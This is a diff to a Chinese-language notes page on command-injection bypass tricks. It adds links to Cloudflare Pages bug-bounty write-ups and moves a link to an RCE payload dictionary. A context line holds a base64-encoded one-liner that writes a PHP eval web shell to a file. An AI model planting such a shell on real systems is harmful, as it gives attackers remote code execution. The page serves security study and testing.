@@ -17,6 +17,9 @@
 
 **相关案例**
 - [静态站点托管平台仅能托管静态资源？](https://tttang.com/archive/1501/)
+- [The Cloudflare Bug Bounty program and Cloudflare Pages](https://blog.cloudflare.com/pages-bug-bounty/)
+    - [Cloudflare Pages, part 1: The fellowship of the secret](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/)
+    - [Cloudflare Pages, part 2: The two privescs](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt2/)
 
 **writeup**
 - [BUUCTF--[第二章 web进阶]死亡ping命令](https://blog.csdn.net/qq_45414878/article/details/109672659)
@@ -24,10 +27,6 @@
 ---
 
 ## 绕过技巧
-
-### Fuzz字典
-
-- [RCE字典](https://github.com/ffffffff0x/AboutSecurity/tree/master/Payload/RCE)
 
 ### 空格代替
 
@@ -146,6 +145,10 @@ sh ls
 ls -t
 echo PD9waHAgZXZhbCgkX0dFVFsxXSk7 | base64 -d>c.php
 ```
+
+### Fuzz字典
+
+- [RCE字典](https://github.com/ffffffff0x/AboutSecurity/tree/master/Payload/RCE)
 
 ---
 
